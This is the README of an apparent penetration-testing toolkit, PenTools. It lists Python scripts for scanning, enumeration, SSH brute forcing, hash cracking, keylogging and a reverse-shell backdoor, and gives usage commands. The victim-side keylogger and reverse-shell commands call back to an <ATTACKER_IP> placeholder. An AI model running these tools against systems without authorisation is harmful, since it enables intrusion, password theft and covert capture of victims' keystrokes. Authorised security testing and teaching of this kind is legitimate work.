# PenTools 🛡️

**PenTools** is a collection of Python scripts designed for cybersecurity professionals, penetration testers, and enthusiasts. These tools cover various phases of a penetration test, from reconnaissance to exploitation.

> ⚠️ **DISCLAIMER**: This repository is for **EDUCATIONAL PURPOSES** and **AUTHORIZED TESTING ONLY**. The author is not responsible for any misuse of these tools. Do not use these tools on any system without explicit permission.

## 📦 Tools Included

| Tool | Description |
|------|-------------|
| **Network Scanner** | Scans local network for active devices using ARP requests. |
| **Port Scanner** | Scans specific or range of ports on a target IP to find open services. |
| **Subdomain Enumeration** | Multi-threaded tool to discover subdomains using a wordlist. |
| **Directory Enumeration** | Brute-forces directories on a web server to find hidden paths. |
| **SSH Brute Force** | Multi-threaded SSH password cracker. |
| **Hash Cracker** | Simple tool to crack hashes using a dictionary attack. |
| **KeyLogger** | Captures keystrokes and saves them to a file (requires Admin privileges). |
| **JS Crawler** | Downloads all JavaScript files from a target URL. |
| **Reverse Shell** | Remote access tool (Backdoor) with client-server architecture. |

## 🚀 Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/PenTools.git
   cd PenTools
   ```

2. Create a virtual environment (Recommended):
   ```bash
   # Windows
   python -m venv .venv
   .venv\Scripts\activate

   # Linux/Mac
   python3 -m venv .venv
   source .venv/bin/activate
   ```

3. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
   *(Note: You may need to create a requirements.txt file with: `requests`, `scapy`, `paramiko`, `keyboard`, `pyfiglet`)*

## 🛠️ Usage

### Subdomain Enumeration
```bash
python web/subdomain_enumeration.py <IP> -w resources/wordlists/subdomains.txt
```

### SSH Brute Force
```bash
python network/ssh_bruteforce.py <IP> <USER> <WORDLIST> -t 10
```

### Directory Enumeration
```bash
python web/directory_enumeration.py <IP> -w resources/wordlists/directories.txt
```

### KeyLogger
**Server (Attacker):**
```bash
python spyware/keylogger_server.py -p 8080
```

**Client (Victim):**
```bash
python spyware/keylogger.py --ip <ATTACKER_IP> --port 8080
```
*(Requires Administrator/Root privileges to capture keys)*

### JS Crawler
```bash
python web/js_crawler.py http://example.com -o found_scripts
```

### Hash Cracker
```bash
python crypto/hash_cracker.py <HASH> -w resources/wordlists/passwords.txt -m md5
```

### File Downloader
```bash
python web/file_downloader.py <URL> -o filename.ext
```

### Reverse Shell (Backdoor)
**Server (Attacker):**
```bash
python backdoors/listener.py -p 4444
```

**Client (Victim):**
```bash
python backdoors/reverse_shell.py --ip <ATTACKER_IP> --port 4444
```

## 🤝 Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

## 📝 License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
